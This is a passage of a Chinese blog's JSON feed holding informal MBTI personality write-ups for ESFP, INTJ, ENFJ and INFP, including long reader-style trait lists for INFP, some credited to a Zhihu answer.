            "id": "http://www.n1h1l157.live/2020/04/01/MBTI/ESFP%E8%A7%A3%E8%AF%BB/",
            "url": "http://www.n1h1l157.live/2020/04/01/MBTI/ESFP%E8%A7%A3%E8%AF%BB/",
            "title": "ESFP解读",
            "date_published": "2020-03-31T16:00:00.000Z",
            "content_html": "<p>生性爱玩，充满活力，用自己的陶醉来为别人增添乐趣，适应性强，平易随和，可以热情饱满的同时参加极限活动，不喜欢把自己的意志强加于人。</p>\n<h2 id=\"性格特征\"><a class=\"markdownIt-Anchor\" href=\"#性格特征\">#</a> 性格特征</h2>\n<p>喜欢在众人面前展现自己并用肢体、表情，语言把大家逗乐，往往一个表情就是一出戏，目光在周围看来看去，然后很兴奋地傻乐。</p>\n<p>充满好奇并且时常令人称奇。兴奋、变通、热爱生活、热情洋溢。容易获得了最多的朋友和最广泛的人际圈。</p>\n<p>大都喜欢看娱乐综艺、冒险小说、酷爱旅游、对声音异常敏感。乐趣是 ESFP 的动力源泉。在文艺表演方面有惊人的天赋，能轻松的学会歌唱，舞蹈。尤其是讲笑话。</p>\n<p>是群体的开心果，容易会成为各种聚会的焦点和中心。表情最丰富、同时也是最热情奔放、最讨人喜欢的类型。</p>\n<p>喜好旅游、探险，不断接触新奇有趣的地方和人，不断的发现这个世界存在的美好，而这与 ESFP 的性格特质可以结合的天衣无缝。</p>\n<p>热情来去自由，自如的游走于不同的圈子之间，他们觉得和你在一起开心，就会缠着和你玩。可如果沉闷和无聊开始降临，他们又会迅速溜走，到别的地方寻找新的乐趣。</p>\n<p>整个世界就像个游乐场，而自己则位于游乐场的中心，他们的任务就是一个项目接一个项目地去玩，是 16 型人格当中看起来心理年龄最小的。</p>\n<p>在物质上最随性的人（花钱如流水）。除非有环境限制或工作需要，理财这两个字跟他们不沾边。在财物方面的大方随性。</p>\n<p>独有的孩子般的天真和让别人开心的能力，天生就是恋爱达人和佼佼者。大都喜欢以 “宝宝” 自居，男性也是如此，只是不会向外人表达出来。</p>\n<p>排斥一切与快乐对立的事物，对无聊的、枯燥的、沉重的人或事是最没有耐心的，如重复而枯燥的事情，听不懂笑话的人，没人情味的戴面具的家伙。</p>\n<p>有一种没有快乐就离开的倾向，觉得你给予他们太多压力，以及和你谈话相当无趣，他们就不会呆在你身边，这也经常会伤害到他们周围的一些人。</p>\n<p>容易对程序蔑视和对组织及秩序的不尊重。很难把日程表当做生活中的一部分。往好处说会招惹麻烦，往坏处说则会碍手碍脚。</p>\n<p>活在当下，看不出其行为、决定或举措会对大局有何影响。结果心血来潮的旅行、随随便便的一句话，就会造成他们万万想不到的严重后果。</p>\n",
            "tags": [
                "ESFP"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2020/04/01/MBTI/INTJ%E8%A7%A3%E8%AF%BB/",
            "url": "http://www.n1h1l157.live/2020/04/01/MBTI/INTJ%E8%A7%A3%E8%AF%BB/",
            "title": "INTJ解读",
            "date_published": "2020-03-31T16:00:00.000Z",
            "content_html": "<p>喜欢独处，善于总结。打心里觉得自己与众不同，善于向内探索，对心理学哲学非常感兴趣。通过精神上的交流是亲近他们唯一的方法。</p>\n<h2 id=\"性格特征\"><a class=\"markdownIt-Anchor\" href=\"#性格特征\">#</a> 性格特征</h2>\n<p>陌生人看来，他们内向，冷漠孤傲，高冷，生人勿扰。</p>\n<p>毕生都在追寻生命的意义，他们需要信念，信念是他们活着的动力。</p>\n<p>逻辑严谨，思路清晰，往往一针见血的指出问题的实质。他们时刻都在成长，对一成不变、废话连篇的人是零容忍的。</p>\n<p>作为完美主义者，会在成长过程中不断对自我性格进行完善补充，他们也希望能与伴侣共同成长。</p>\n<p>处事干练，执行力强，善于策划，不拖泥带水，工作能力比较强。他们善于对事情整体局势的把握。</p>\n<p>感情决绝，理想中的另一半成熟且独立，追求亦师亦友的思维伴侣。一旦遇到喜欢的人，他们克服一切困难的力量和信心不可小觑。</p>\n<p>智性恋，幕强。低调、有内涵、强大且温柔、慈悲的人容易吸引 intj，理想中的另一半有超脱主流世俗的独立明确的想法。</p>\n<p>成熟后：聪明，执行力强，能坚持，胆子大，intj 女像男生的性格，善良，不近人情，完美主义，意志力强，好奇心强，观察力强，孩子气，脑洞大，兴趣不合群。</p>\n<p>成熟后：不在乎别人看法，专一痴情，有计划性，理性，独立注重生活品质。天生直觉，终生学习，对智商不够的人没什么耐心，人格沙盘。</p>\n<p>会被人误会，却不太爱解释，除非是自己在乎的人。一旦被惹恼，不爱搭理人。</p>\n",
            "tags": [
                "INTJ"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2020/04/01/MBTI/ENFJ%E8%A7%A3%E8%AF%BB/",
            "url": "http://www.n1h1l157.live/2020/04/01/MBTI/ENFJ%E8%A7%A3%E8%AF%BB/",
            "title": "ENFJ解读",
            "date_published": "2020-03-31T16:00:00.000Z",
            "content_html": "<p>热情坦诚，灌输信念，富有人格魅力和正义感。虽然所有的 EF 类型都可以说是热情的，在这里描述 ENFJ 用的词是热情坦诚，因为 ENFJ 的感情是像太阳或者说探照灯一样照向其他人的，没有人格隐瞒。</p>\n<h3 id=\"性格特征\"><a class=\"markdownIt-Anchor\" href=\"#性格特征\">#</a> 性格特征</h3>\n<p>如果你向某人请教问题，这个人知无不言，言无不尽，恨不得倾囊相授、掏心掏肺，还时不时的对你谆谆教诲，这个人很可能是个 ENFJ。</p>\n<p>在 ENFJ 眼里，整个世界是一个和谐的整体，而这个整体是有目的和意义的，这个目的和意义其实只是 ENFJ 自己的观点，但他们却对此深信不疑，并试图把这一信念灌输给其他人。</p>\n<p>热爱人类，对于人类的热爱和他们理想化地看待人类、看待他人有很大关系，因为 ENFJ 经常是看到一个人应该成为的样子，而不是这个人现在实际的样子，会把人理想化。称之为教育家视角。</p>\n<p>经常要求别人去自我实现，要求别人变得更好，好像这是一种每个人对自己的责任一样。认为没有自我实现、没有踏上个人成长之路是不正常的，是遗憾的，缺失的，是错的，是需要被纠正的。</p>\n<p>好为人师，喜欢说教。喜欢讲大道理，希望自己说出来的话是有意义的，而最有意义的事情就是把发现的各种人生道理分享给他人。</p>\n<p>喜欢扮演人生导师的角色。即使不能，也会有一种抑制不住的想把自己知道的东西教给别人的冲动。</p>\n<p>工作风格是积极进取、信心十足，具有较强的人际合作意识。总是在激发大家的热忱、勉励大家坚持、带给大家幽默以及使工作圆满完成的其他需要。</p>\n<p>ENFJ 对组织的使命和价值观是非常敏感的，或者说他们会像对周围的人提出很高的道德要求一样对自己所在的组织提出道德要求。</p>\n<p>在绝大多数情况下，ENFJ 的建议是极有价值的，他们也受人爱戴和钦佩，成为值得信赖的对象。但一旦他们的意见与建议没有被采纳，ENFJ 会极为伤心，认为对方如此不领情而有些怒气。</p>\n<p>ENFJ 女性在工作中的表现往往可圈可点，她们对轻重缓有极好的感觉，总能把大家所期待的 “必须” 与 “应该” 的东西做得非常到位。</p>\n<p>ENFJ 男性会在工作中遇到更为严重的问题。需要带有女性的特质：循循善诱、充满关爱、完善自我、献身精神、宽广的胸怀 —— 这些高尚的特质使传统意义上女性的特质。</p>\n",
            "tags": [
                "ENFJ"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2020/04/01/MBTI/INFP%E8%A7%A3%E8%AF%BB/",
            "url": "http://www.n1h1l157.live/2020/04/01/MBTI/INFP%E8%A7%A3%E8%AF%BB/",
            "title": "INFP解读",
            "date_published": "2020-03-31T16:00:00.000Z",
            "content_html": "<p>通常很安静、温柔，看起来比较软。他们看起来” 软 “，但是内心却极为坚定，不容撼动。</p>\n<h3 id=\"性格特征\"><a class=\"markdownIt-Anchor\" href=\"#性格特征\">#</a> 性格特征</h3>\n<p>会经常性感到孤独，他们的孤独来自于不被人” 理解 “。他们很难遇到完全理解自己的另一个人。他们似乎是漂泊在这个无人欣赏他们的世界。</p>\n<p>有着自己理想的朋友，会发现现实中的朋友们总是会和自己的想象中不太一样，进而产生无人理解的孤独感。</p>\n<p>会时常沉浸在自己的思索中，而且外人很难看出来。他们会探索自己的内在本质，沉浸在自己的心灵中。</p>\n<p>喜欢” 美 “，不是具体的颜色、风格，而是抽象的、整体的美。这份美就像画卷。也许是一片叶，也许是一片云，也许就是手中的某件物品。</p>\n<p>通常情绪敏感。能察觉到其他人一些细微的情绪变化，而且会有一种抚平别人伤痛的冲动。他们不愿世人遭受痛苦，即使自己经常处于自我否定的煎熬中。</p>\n<p>在看别人的情绪时，可能会感同身受。他们会不自觉地将自己代入其中，体会到这份感觉，受到他们的影响。受环境影响的可能性很大。</p>\n<p>优势：富有同情心，不加评判，总是愿意听别人的故事。和周围人能保持和谐的关系，善于把矛盾遮掩下来。</p>\n<p>为人通常慷慨，不计回报。他们会尽最大努力给他人带来快乐。他们不愿看到在乎的人因为自己而不开心。包容心强。</p>\n<p>劣势：深陷自卑的泥沼，情绪漩涡，他们的情绪内核是混沌的。他们会受到周围人的影响，不自觉地吸收他人的情绪。当他们深陷情绪中时，旋转的漩涡会吞噬一切。归向虚无。悲伤、痛苦、自卑…</p>\n<p>如果你的批评，他们做不到，这只会加剧他们的自卑。同时，不要带很负面的情绪跟他们说，譬如嫌弃、厌恶、烦闷的情绪等。</p>\n<p>他们喜欢自己骗自己。自卑倾向，虽然他们当中很多人能力出众，但依然觉得自己不行，不好，不够好。</p>\n<h3 id=\"性格描述\"><a class=\"markdownIt-Anchor\" href=\"#性格描述\">#</a> 性格描述</h3>\n<p>对很多事都感兴趣。对新奇的、没尝试过的 or 看上去很厉害的东西都想去试试。</p>\n<p>眼高手低、三分钟热度。常常制定过高的计划，但是实际上很难坚持住。</p>\n<p>大都喜欢画画、手工。创作的时候非常快乐。可以做到高度精神集中、废寝忘食，在完成一件作品后非常有成就感。</p>\n<p>喜欢音乐剧、悲伤悠扬类的曲调。听轻音乐时会联想到画面。</p>\n<p>别人遇到困难马上希望能尽自己一份力。别人不舒服会去关心，看到网上很惨的经历会想捐款。</p>\n<p>有自己的原则。讨厌三观不正、不努力的人。最讨厌三观不正，主要表现为自私、无道德感这两种。碰到这种人想要远离。</p>\n<p>拖延症晚期。什么事都喜欢压在 deadline，享受那时的压力所产生的高速动力。</p>\n<p>有时有些迟钝。会被说傻傻的，在察言观色方面不是特别在行？尤其是语言暗示，常常 get 不到。</p>\n<p>情感方面非常迟钝，也没有特别喜欢过的人，自己度过的时光很开心，觉得每天都无限有趣。</p>\n<p>跟朋友聊天嗨到爆，打开连珠炮模式，讲不停。但是多人场合无比局促难受，想马上离开，沉默不语。</p>\n<p>喜欢幻想。不拘小节，不喜欢打扮。喜欢别致，独一无二的东西。对金钱欲望不强。</p>\n<p>万事都往好处想，所以生活中缺乏压力。非完美主义。喜欢梦，感觉做梦是一种超快乐的体验。</p>\n<p>自我意志不坚定，极容易受人影响。总体比较低调，不太会疯狂自夸，即使有事情值得夸耀，但会觉得尴尬说不出口。</p>\n<p>不愿意拜托别人，别人对我好想加倍奉还。移情能力有时很强。</p>\n<h3 id=\"理想恋人\"><a class=\"markdownIt-Anchor\" href=\"#理想恋人\">#</a> 理想恋人</h3>\n<p>复杂但仍干净。知道人情冷暖但仍去选择干净。这份干净是装不出来的。</p>\n<p>雌雄同体。这个东西不需要刻意做到，但是你能感觉得出来。勇敢且温柔，知性。</p>\n<p>保护好自己而且能把自己照顾的很好。只有自己先活的好才能真正让另一个人感到幸福。</p>\n<p>聪明。感知得到普通人感知不到的情感，东西。</p>\n<p>知分寸，知进退，懂得自重和尊重他人。</p>\n<p>懂得并享受人类的高级快乐。</p>\n<p>可以优雅到超凡脱俗，也可以平凡到混迹于人群。</p>\n<p>做一个更加纯粹的人。追求去做个更加纯粹的人。做不到十全十美但是我们会努力做到十全六七八美。</p>\n<p>渴望了解，抚平伤痛，做个坚强的盾牌。INFP 渴望去了解别人，治愈别人。可自己的伤口却无法治愈，只能偷偷地在夜晚独自舔舐伤口。</p>\n<p>会爱。不要求一开始就知道满分的答案，但是一定要想去探索爱情的真谛。我肯陪着你一起走。</p>\n<p>能讲故事。INFP 很喜欢听故事的，什么对他们来说都可以是很吸引人的故事。包容。</p>\n<p>温柔成熟优雅懂事。</p>\n<p>拥有所有的感情，不麻木。可以笑可以哭可以吵闹，敢爱敢恨敢作敢当。可以掩饰但绝不吝惜表达出来。但是平常给你的感觉就是平静，和她在一起心很踏实。</p>\n<p>给你别人不曾给过的东西。基本上都不是物质上的，那是一种感觉，又或是一段无与伦比的回忆，或是她的某一次对你的眼神，对你的笑容。</p>\n<h3 id=\"八维分析\"><a class=\"markdownIt-Anchor\" href=\"#八维分析\">#</a> 八维分析</h3>\n<h4 id=\"fi\"><a class=\"markdownIt-Anchor\" href=\"#fi\">#</a> Fi</h4>\n<p>幼年时最喜欢使用 Fi，寻找认同和归属感、探寻自我价值，渴望情感的共鸣。他们常常表面波澜不惊，但内心早已翻江倒海、波澜壮阔。</p>\n<p>不成熟时是无骨的，总想有支撑物；又像是一缕清魂，总想让自己的灵魂附在一个人、动物或物体上，很难从极度依恋中抽离。</p>\n<p>喜欢文学，尤其易被悲剧文学吸引，在角色的绝望、挣扎、破碎、癫狂中，感受到强烈的情感传达。他们是落单的，渴望被理解的。会容易被性格鲜明、特立独行的人吸引。</p>\n<p>Fi 始终在寻找，探寻梦想、自我、价值观，寻找自己在世界上的定位。INFP 渴望寻找到生命的激情，从此便具有持续爆发的内驱力。</p>\n<p>在 T 充分发展之前，INFP 经常会不顾一切、万分期待地准备一件事，遇到挫折又会迅速地自暴自弃。</p>\n<h4 id=\"ne\"><a class=\"markdownIt-Anchor\" href=\"#ne\">#</a> Ne</h4>\n<p>Ne 发展后，INFP 展现出灵性的魅力。Ne 探索外部世界的各种可能性，探寻多种事物的内在联系。</p>\n<p>在 Ne 的作用下，INFP 的爱好会非常广泛。画画、文学、摄影、电影、旅行、心理学。</p>\n<p>INFP 喜欢在艺术中寻找灵魂和精神的共鸣，这种灵感是随心的，当然，还会有些三分钟热度。</p>\n<p>对神秘的事物有极大的兴趣，他们会一头扎进去研究世界未解之谜、神秘的宗教、离奇的故事。</p>\n<h4 id=\"si\"><a class=\"markdownIt-Anchor\" href=\"#si\">#</a> Si</h4>\n<p>INFP 非常念旧。这主要是因为第三功能 Si。Si 是对过往事件的记忆、对经验的总结，和对所有与自己有关事物的细节观察。会喜欢收藏用过的物品，像是在收藏一种记忆。</p>\n<p>在 INFP 伤感时，Si 会经常扮演消极角色，它会让 INFP 牢牢记着自己的创伤，总是忍不住陷在回忆的旋涡里，一遍又一遍地舔舐伤口、顾影自怜。</p>\n<p>盘点旧物什，追忆过往，陷在悲伤里颤抖，等待有人拯救。有时 Fi 还会利用 Si 编故事，INFP 想要得到什么情绪就能从回忆中提取什么情绪，自怨自艾和情绪恢复是非常消耗时间的。</p>\n<h4 id=\"te\"><a class=\"markdownIt-Anchor\" href=\"#te\">#</a> Te</h4>\n<p>Te 是对外部世界的塑造和秩序控制。表现为对物的整理，对方案的高效实施，对多个选项的果断决策，和对他人的控制欲。</p>\n<p>逃避 Te 的 INFP 有很多梦想，但都没去圆梦。当外界对 INFP 有要求或压力时，INFP 还会痛苦地妥协。</p>\n<p>会转换成上帝视角，冷静而理智地看待自己身上所发生的一切，借助 Si 将经历汇总，并使用 Ti 分析事件的内在原理，分析情绪与事件背后的本质联系。</p>\n<p>Fi-Ti 的判断组合，使 INFP 通过自省实现自我合理化，INFP 会建立自我价值体系，会更理智客观地评价自己，自我怀疑的机会会大量减少。</p>\n<p>发展 Te 外向思维是 INFP 必须的使命，但作为劣势功能，INFP 对 Te 是又爱又恨。一方面潜意识非常抗拒和逃避这个功能，一方面又很羡慕崇拜执行力强、雷厉风行的人。</p>\n<h4 id=\"评价\"><a class=\"markdownIt-Anchor\" href=\"#评价\">#</a> 评价</h4>\n<p>是梦幻，是美，是逍遥，是深刻，是灵魂中散发香气的。自嘲为 “空想家”。于他们而言，梦想即是生命，灵魂必须伴随着激情而生。</p>\n<p>都会多或少经历过孤独、敏感、情绪化、自我怀疑，而这无非是成长的课题。</p>\n<p>成熟后有强大信念、坚不可摧，不被客观环境影响，同时也有足够强的创造力，能造梦，也能圆梦，在这世间灵动而圆满地栖息。</p>\n<h3 id=\"yj性格分析\"><a class=\"markdownIt-Anchor\" href=\"#yj性格分析\">#</a> YJ 性格分析</h3>\n<ul>\n<li>\n<p>内心像个小孩子，天真活泼纯粹、喜欢幻想、有梦想。</p>\n</li>\n<li>\n<p>有很多新奇的观点，喜欢探索外部世界的各种可能性，探索多种事物之间的联系。</p>\n</li>\n<li>\n<p>天马行空，有时候会胡思乱想，会因为一些无端联想而陷入自责的泥潭。</p>\n</li>\n<li>\n<p>有时候会过度反省，他人的不经意一言一行，环境的一点点风吹草动，都会引起情绪波动。</p>\n</li>\n<li>\n<p>不是很喜欢表现自己，比较低调，不是很会自夸，即便事情做的足够好。</p>\n</li>\n<li>\n<p>有些拖延，不是很喜欢做计划，率真随性，充满活力。</p>\n</li>\n<li>\n<p>外表看起来很软，很细腻。内心却很坚定，有自己的追求，不容撼动。</p>\n</li>\n<li>\n<p>很少当面指出别人的错误来，默默的远离那些消耗自己的人或事。很难习惯对他人提要求。</p>\n</li>\n<li>\n<p>很聪明，能力出众，但依然觉得自己不行、不够好。不喜欢冲突。</p>\n</li>\n<li>\n<p>会不自觉的吸收周围人的情绪，当周围的人情绪低落时他们很容易就能感受到。</p>\n</li>\n<li>\n<p>理想主义者在一定程度上会脱离现实，对精神的追求大于对金钱的追求，渴望灵魂上的共鸣。</p>\n</li>\n<li>\n<p>有喜欢哲学、心理学的倾向。喜欢聊抽象的话题，生命的意义，外星人，生命，爱这些话题。</p>\n</li>\n<li>\n<p>喜欢强大、内敛、谦虚的性格，容易对神秘的事物感兴趣。渴望有人能够真正理解自己。</p>\n</li>\n</ul>\n<h3 id=\"人群中的infp\"><a class=\"markdownIt-Anchor\" href=\"#人群中的infp\">#</a> 人群中的 INFP</h3>\n<p>文章来源:<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzM3NDMzMTA0OS9hbnN3ZXIvMTg5ODYwMTk2MQ==\">https://www.zhihu.com/question/374331049/answer/1898601961</span></p>\n<p>1. 气质比较软（大部分，男女都有）</p>\n<p>2. 对陌生人有一点点冷淡（主要是太怂不敢主动交流）</p>\n<p>3. 经常性发呆选手，要是兴致来了呆一天也不在话下</p>\n<p>4. 会有些笨拙，做错事情了会使劲道歉</p>\n<p>5. 对 infp 说你很在乎他（她），他（她）就会当场流泪猫猫头</p>\n<p>6. 老胃病患者</p>\n<p>7. 与大集体脱轨</p>\n<p>8. 会很乐意与别人一对一交流</p>\n<p>9. 经常性傻笑选手，尽管之前很沉默严肃的在做事情，心里想到好笑的或开心的事，会当场笑出来</p>\n<p>10. 走路很慢，经常会看沿途的风景，一言不发</p>\n<p>11. 非常害怕做错事，但是经常三心二意的犯错，会为此感到非常羞耻</p>\n<p>12. 将三分钟热度发扬到极致，前一天买了一大堆关于兴趣爱好的东西，用了两天就吃灰了</p>\n<p>13. 会非常乐意钻研感兴趣的一些冷门知识</p>\n<p>14. 交往前岁月静好，交往后疯批抠脚</p>\n<p>15. 极其擅长察言观色，你在和他（她）交流时，你的心思他（她）全都知道，但是不会告诉你，并且会遵循你的目的柔和的演戏捧场</p>\n<p>16. 极其讨厌冲突争执，他（她）们也非常不擅长处理这些，十分容易被强势的人欺负的屁滚尿流</p>\n<p>17. 很喜欢一个人待着但又为此很难过（因为没有人陪伴）</p>\n<p>18. 每周都会有那么一两个小时的时间用来哭（也会是在心里哭）哭完之后精气神会更好（前提是没有人打扰）</p>\n<p>19. 语言痴呆症患者，发言如下:“让我看看厚、啊这、emmmmm、额？！、蛤？”（当然很多都是都是为了巩固呆萌身份而装的，不过大部分时间是真的呆）</p>\n<p>20. 撤回狂魔，哪怕写错一个字，都会马上撤回，尽管对方没有注意到</p>\n<p>21. 说话很快，而且经常卡壳，吐字有一点不清（有一部分会这样，主要是长期的自卑引起的）</p>\n<p>22. 精通五大礼貌用语，自己没有用上会浑身不自在</p>\n<p>23. 学生时期可能会被一些强势的老师针对，有一部分可能会被校暴</p>\n<p>24. 被调皮的人玩弄会很生气，但是不会有很多反应（主要是不知道怎么处理）</p>\n<p>25. 第一印象是很温柔随和，但是会有一点冷</p>\n<p>26. 非常喜欢被交朋友</p>\n<p>27. 对别人的评价永远不会太坏，他（她）们能看清别人的优势和劣势，并且十分友善的给出积极的评价，即使他（她）很讨厌那个人</p>\n<p>28. 宅，是真的宅</p>\n<p>29. 由于想象力过于丰富十分不适合看恐怖片或者恐怖游戏，即使胆小如鼠，也还是会犯贱自己去玩去看，到头来失眠的是自己</p>\n<p>30. 会很喜欢小动物，只要是有毛的都会想去 rua 一下</p>\n<p>31. 房间凌乱不堪，但是乱中有序，不过极少收拾（因为行动力太差）</p>\n<p>32. 恐惧电话铃声，总感觉铃声里传来的是坏消息（常年静音患者）</p>\n<p>33. 如果是在学生时代，你是无法在厕所找到 infp 的</p>\n<p>34. 并不会对昆虫或者是爬行动物感到恐惧，这些动物还是很可爱的</p>\n<p>35. 不喜欢跟风，对网红 xx 这个字眼有些排斥</p>\n<p>36. 超级喜欢老旧事物，喜欢他们背后封尘的故事</p>\n<p>37. 有一点点智性恋倾向</p>\n<p>38. 别人劝你做或者是改某些事</p>\n<p>表面：我好像真的错了我一定好好改进</p>\n<p>内心：你说你接着说反正我一个字也听不进去</p>\n<p>39. 在 1－7 岁的时候跟现在的反差会很大，长辈都说从以前的野蛮活泼变成了腼腆文静</p>\n<p>40. 可能连跟长辈问好的勇气都没有，家里来客人了？那就进防空洞（卧室）</p>\n<p>41. 看着像 lsp，但是内心绝对是最纯情的</p>\n<p>42. 无论过得多惨，但是仍旧相信人生和未来是美好的</p>\n<h3 id=\"infp特质\"><a class=\"markdownIt-Anchor\" href=\"#infp特质\">#</a> INFP 特质</h3>\n<p>文章来源:<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzM3NDMzMTA0OS9hbnN3ZXIvMTg5ODYwMTk2MQ==\">https://www.zhihu.com/question/374331049/answer/1898601961</span></p>\n<p>1. 在电梯里会默默站在角落，会帮忙按楼层和开关。（会特别注意不让电梯门夹到人以及帮别人留门）</p>\n<p>2. 不合群，但是不是被动不合群（不是被孤立），而是自然而然地自动选择不合群，努力降低自己的存在感，很怕被 cue。</p>\n<p>3. 喜欢动物，经常会喂流浪猫狗，经常白嫖路上遇到的别人家修勾，看到就走不动路。</p>\n<p>4. 很单纯，没什么心机，心里弯弯绕很多，但是说出口的话无比的直白，但是这种直白也会适当考虑别人的感受。</p>\n<p>5. 一把年纪了（不是）还会喜欢哆啦 A 梦，樱桃小丸子，蜡笔小新，武林外传，恶作剧之吻之类的动画片和偶像剧。</p>\n<p>6. 会想让自己看起来独立强大，但是对于亲密的人又想展示出自己丑陋溃烂的一面，因为总觉得要坦诚相待，然后又觉得不妥，所以在高冷强大和脆弱忧伤之间反复横跳。</p>\n<p>7.Deadline 就是第一生产力，不拖到最后是不会去完成的。所以经常会看到平时懒懒散散，然后重大的考试，或者是工作结束之前，会表现的跟打鸡血一样亢奋。</p>\n<p>8. 追求美，但是懒，所以日常装扮就是在流浪汉和精致都市丽人之间反复横跳（流浪汉装扮的时候比较多）</p>\n<p>9. 相较于 intp 热爱探究宇宙的真相，infp 更喜欢研究人性、人与社会的关系、心理学等。对人的情感，人之间的羁绊非常感兴趣，研究这些也是出于了解自己、治愈自己的目的。</p>\n<p>10. 经常会蹦出看似没头脑的，稀奇古怪的，但是实际上好像是那么回事，有些道理的言论。</p>\n<p>10. 熬夜国家一级选手，自控力差，而且拖延症严重，导致长期熬夜，黑眼圈很重，早上看起来都懵懵的迷迷糊糊，没有什么精神。</p>\n<p>11. 逻辑性差，数学成绩不好（就很差）。想象力丰富，从小语文的成绩比较好，作文经常被老师夸赞。【经评论区提醒修改，就仅代表我是数学渣本渣】</p>\n<p>12. 不张扬的小叛逆，从小非常讨厌组织纪律这些东西。但是也不会带头反抗，只会在背后找信得过的人吐槽，然后带动情绪让傻大个去出头。</p>\n<p>13. 远看像个面瘫 / 智力障碍者，接触起来会发现是个大脑超前发育的手舞足蹈外星人。</p>\n<p>14. 每次都会给街头的乞讨者 / 卖艺者一些零钱。</p>\n<p>15. 写文字的时候喜欢拐弯抹角运用各种举例、暗喻来表达自己的观点。</p>\n<p>16. 第一眼就没好感的人不会再接触。</p>\n<p>17. 总觉得自己的直觉很强，觉得自己有异于常人的第六感，但是也不敢肯定。</p>\n<p>18. 晚上比白天思维更活跃，喜欢在晚上处理事情，发动态。</p>\n<p>19. 看脸。</p>\n<p>20. 年轻时非常容易被 pua，长大成熟以后非常容易 pua 别人。</p>\n<p>21. 方向感比较差。</p>\n<p>22. 莫名很招小孩子喜欢（尽管可能本身并不喜欢小孩），但实际就是处得来，而且觉得小孩子的玩具好玩，能坐那儿自己玩半天。</p>\n<p>23. 自我厌弃的情绪很严重，不够自信。价值观在不断地坍塌重建，会在小号 or 仅自己可见的微博、朋友圈去发表看法（把事情捋一遍然后反思哪里做得不够好，下次如何克服不足做得更好、或者是很消极情绪化之类的内容）</p>\n<p>24. 对他人的情绪变化的感知非常敏锐，是默不作声就会照顾到弱者的人。比如舍友姨妈疼，默默泡好红糖水和暖宝宝一起放舍友桌上。是会把碎玻璃和刀片用胶带缠好再扔到垃圾桶里。是会默默放慢脚步跟在落在后面的人身边的位置，不愿意让别人感到被冷落或者无助，有很强大的利他精神。</p>\n<p>25. 喜欢或者讨厌某些事物并不会直说，经常表示 “看你，我都行”，“没有没有，没不开心，你想多了”，“我更喜欢 XXX（实际上就是不满意目前这个东西）”，对方如果没能 get 到自己的真实想法就会觉得很委屈，但还是忍着，很能忍！自己让自己活得很累。</p>\n<p>26. 据本人照镜子以及拍照观察，infp 的眼神像小鹿，一眼能看穿人的那种澄澈和坦荡，有些忧郁 / 深情（可以参考一下梁朝伟的眼睛，虽然我不知道他是哪个人格）不喜欢直视别人的眼睛，但是跟人沟通的时候会非常有礼貌地一直注视对方的双眼或者是眉间，并且认真地点头附和，让对方感到自己被重视。</p>\n<p>27. 很恋旧，有囤物癖的倾向。下到小时候用过的课本和橡皮擦，上到用过的旧手机都舍不得扔。家里的日用品囤货很多。</p>\n<p>28. 乱中有序，随手就能找出想要拿的物品。舍不得扔的东西一多家里就会乱，但是他们总是能飞快就拿到自己想要的。对于他们来说，这不是乱，是不拘小节，是有生活气息，每个东西都应该自由自在地存在。</p>\n<p>29. 很少看悬疑片或者灾难片，看得多的是喜剧片或者文艺爱情片。不喜欢看烧脑的情节，更喜欢找轻松的、能引起情感共鸣的片子来下饭。就我本人来说，我很喜欢印度电影，印度电影基本被我看个遍了，跟着片子里面的歌舞情节摇头晃脑真的快乐（安利一波）。</p>\n<p>30. 物质欲望很低，但是对于精神需求很高。所以追 infp 的女生不需要你多有钱，只要能一直对她好就行（傻女孩 ）。尽管并不追求奢侈品，但是能无忧无虑地做自己想做的事情之前提就是财务自由，所以他们常因理想和现实的差距而感到苦恼，朴素但是坚定地好好工作。</p>\n<p>31. 是个悲观主义者，最常问的问题就是 “世界还会好吗？”，看到杀妻虐猫之类的社会新闻，会难过到失眠，会觉得人类辜负了自己的信任（好中二），不管什么事，都会预先做好最坏的打算，然后往往因为事件实际上没有自己想得那么糟糕，所以心态就会比较平和，“悲观是为了更好的乐观。”</p>\n<p>32. 这条不作为 infp 的刻板印象，仅代表我自己。是泪失禁体质，听不得重话，嘴笨没法吵架，话还没说出口眼泪先射出来。不仅仅是伤心会泪失禁，情绪一激动也会泪失禁，一开始还没感觉啥，但是流泪了流着流着就感觉自己变成真委屈了，也许这也算物质决定意识？？？</p>\n<p>33. 独来独往，都是一个人上课下课，不喜欢抱团行为（非常非常非常好的朋友除外，无法理解女生去厕所为什么要手拉着手。走路是慢悠悠地在晃，头一般都低着看地板，看起来不是失落，而是若有所思的样子，一般戴着耳机。</p>\n<p>34. 虽然社恐，但是遇到躲不过的碰面的时候，会下意识展示出最职业性的笑容，就那种，脑子还没反应过来，已经嘴角上扬八颗牙漏出来了。</p>\n<p>35. 经常自言自语，比如吃饭的时候喃喃自语 “今天这个菜不太好吃。” 或者把自己的下一步行动计划念出来。“那我就先这样然后再那样，应该就可以了吧。” 不是故意的行为，有时候自己都没反应过来。</p>\n<p>36. 反应会慢半拍，没有那么敏捷。因为心理活动很丰富，在做决定前已经权衡了一番利弊，然后又跟自己的直觉做对比，所以比较纠结犹豫，不过最后一般都会选择直觉【第一眼喜欢的】。</p>\n<p>37. 为什么你一直在哭呢？</p>\n<p>38. 不一定喜欢发表情包，但是发消息或者网络发言的时候喜欢打省略号【……】，感觉这样比较委婉，伤感情的 / 引发矛盾的话不敢说出口，就用省略号让别人自己意会去。</p>\n<p>39. 捧场王，看不得气氛冷场大家尴尬，会自觉接过最后一个发言人的话，努力把气氛往轻松诙谐的方面带。</p>\n<p>40.ta 是很好的倾听者，会让人不自觉把内心的话都对 ta 倾诉，觉得没有压力，微暖的温度很安心。ta 安慰人很有一套，因为很能代入自己以后感同身受。【但是 ta 本人也并不是什么圣母玛利亚，一直被倾诉负能量是会感到烦的，特别是那种冥顽不灵的人，比如男朋友家暴自己还出轨，但是自己舍不得分手之类的，瞬间就会让 ta 忍不住展现出冷漠的一面（要死死外面，别碍我的眼）】</p>\n<p>41. 善于计划想象但是行动力很差，也很欠缺自律。经常三分钟热度，打卡健身或者是背单词什么的，没多久就会不了了之了。</p>\n<p>42. 